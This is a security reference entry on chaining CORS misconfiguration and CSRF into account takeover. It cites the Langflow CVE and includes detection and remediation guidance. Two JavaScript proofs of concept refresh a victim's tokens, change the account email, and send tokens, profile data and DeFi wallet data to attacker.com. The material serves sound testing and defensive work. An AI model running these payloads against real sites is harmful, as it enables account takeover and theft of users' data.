# CORS + CSRF Chain to Account Takeover

**Category:** CORS Misconfiguration + CSRF
**Severity:** Critical
**CVSS Range:** 8.8 - 9.8

## Attack Description

CORS misconfigurations become devastatingly powerful when chained with CSRF weaknesses. The combination allows an attacker to both **write** (CSRF: perform actions) and **read** (CORS: steal response data) cross-origin. This enables full account takeover chains:

1. Use CSRF to trigger a sensitive action (password reset, token refresh, email change)
2. Use CORS to read the response containing tokens, API keys, or confirmation data
3. Use stolen tokens to impersonate the victim

This is exactly the pattern in CVE-2025-34291 (Langflow): permissive CORS + SameSite=None refresh token cookie + no CSRF protection = full ATO + RCE.

## Prerequisites

1. Permissive CORS policy (origin reflection or null origin allowed)
2. Missing or weak CSRF protection on sensitive endpoints
3. Cookies set with `SameSite=None` (or absent SameSite attribute in older browsers)
4. Sensitive data returned in responses (tokens, keys, user data)

## Exploitation Steps

### 1. Identify the Chain

```
Phase 1: Find CORS misconfig
  -> Test origin reflection, null, regex bypasses

Phase 2: Find CSRF-vulnerable endpoints
  -> Token refresh, password change, email update, API key generation
  -> Check for anti-CSRF tokens, SameSite cookie attributes

Phase 3: Map the data flow
  -> Which endpoints return sensitive data in responses?
  -> Can you chain CSRF action + CORS read?
```

### 2. CVE-2025-34291 Pattern (Langflow)

```
Step 1: Victim visits attacker page
Step 2: Attacker sends cross-origin POST to /api/v1/refresh
  - refresh_token_lf cookie is SameSite=None, so browser sends it
  - CORS allows any origin with credentials
Step 3: Response contains new access_token + refresh_token
Step 4: Attacker reads tokens via CORS (origin reflected)
Step 5: Attacker uses access_token to call /api/v1/validate/code
Step 6: Code execution endpoint runs arbitrary Python = RCE
```

### 3. Generic ATO PoC

```html
<html>
<body>
<script>
async function exploit() {
  // Step 1: CSRF to trigger token refresh (CORS lets us read response)
  const refreshResp = await fetch('https://target.com/api/auth/refresh', {
    method: 'POST',
    credentials: 'include'  // Sends SameSite=None cookies
  });
  const tokens = await refreshResp.json();
  
  // Step 2: Use stolen access token to read sensitive data
  const profileResp = await fetch('https://target.com/api/user/profile', {
    headers: { 'Authorization': 'Bearer ' + tokens.access_token },
    credentials: 'include'
  });
  const profile = await profileResp.json();
  
  // Step 3: Change victim's email (ATO)
  await fetch('https://target.com/api/user/email', {
    method: 'PUT',
    headers: {
      'Authorization': 'Bearer ' + tokens.access_token,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ email: 'attacker@evil.com' })
  });
  
  // Exfiltrate
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({ tokens, profile })
  });
}
exploit();
</script>
</body>
</html>
```

### 4. Wallet-Specific Chain (DeFi Context)

```javascript
// DeFi frontend with CORS misconfig + CSRF on session
async function stealWallet() {
  // Read wallet addresses via permissive CORS
  const walletResp = await fetch('https://defi-app.com/api/user/wallets', {
    credentials: 'include'
  });
  const wallets = await walletResp.json();
  
  // Read pending transactions
  const txResp = await fetch('https://defi-app.com/api/user/pending-transactions', {
    credentials: 'include'
  });
  const pendingTx = await txResp.json();
  
  // If approval/signature endpoints lack CSRF protection:
  // Could potentially queue malicious transactions
  
  // At minimum, exfiltrate portfolio data for targeted phishing
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({ wallets, pendingTx })
  });
}
```

## Detection Method

### Testing the Chain
1. **Map CORS**: Test origin reflection on all API endpoints
2. **Map CSRF**: Identify endpoints that accept cross-origin requests without anti-CSRF tokens
3. **Map Cookies**: Check `SameSite` attributes on all session cookies (`SameSite=None` is the enabler)
4. **Map Sensitive Responses**: Find endpoints that return tokens, keys, or PII in response bodies
5. **Build the chain**: Can you CSRF an action AND read its response cross-origin?

### Key Indicators
- `SameSite=None; Secure` on session/refresh cookies
- `Access-Control-Allow-Credentials: true` with reflected origins
- Token refresh endpoints that only rely on cookies (no additional CSRF token)
- State-changing GET requests

## Remediation

1. **Fix CORS**: Strict origin whitelist, never reflect arbitrary origins
2. **Fix CSRF**: Anti-CSRF tokens on all state-changing endpoints
3. **Fix Cookies**: Use `SameSite=Lax` or `Strict` unless cross-site is genuinely needed
4. **Token binding**: Bind refresh tokens to additional context (IP, fingerprint) beyond just the cookie
5. **Double submit cookie pattern**: Require CSRF token in both cookie and header
6. **Rate limit token refresh**: Detect and block rapid refresh attempts from unusual origins

## Real Examples

1. **CVE-2025-34291 - Langflow (CVSS 9.4)**: Permissive CORS + SameSite=None refresh cookie + no CSRF = full ATO + RCE on AI agent platform. One malicious page visit compromises all stored API keys and service tokens. Discovered by Obsidian Security, Dec 2025.

2. **HackerOne $4,000 Bounty**: CORS + CSRF chain leading to account takeover. CORS vulnerability allowed reading CSRF token from response, then using it to perform account-level changes.

3. **HackerOne #430249 (niche.co)**: CORS misconfiguration leading to private information disclosure, chain exploitable for account takeover.

## Web3 Context

This chain is particularly devastating in Web3 because:
- **DeFi aggregators** store wallet connections and preferences server-side
- **CEX platforms** store API keys and withdrawal addresses
- **NFT marketplaces** store collection data and listing authorizations
- **Bridge UIs** handle cross-chain transaction signing
- **AI agent platforms** (like Langflow) increasingly integrate with crypto APIs

If a DeFi frontend has CORS misconfig + CSRF on session management, an attacker can:
1. Steal session tokens
2. Read connected wallet addresses
3. Access transaction history for social engineering
4. Potentially queue malicious transactions if the frontend has server-side signing
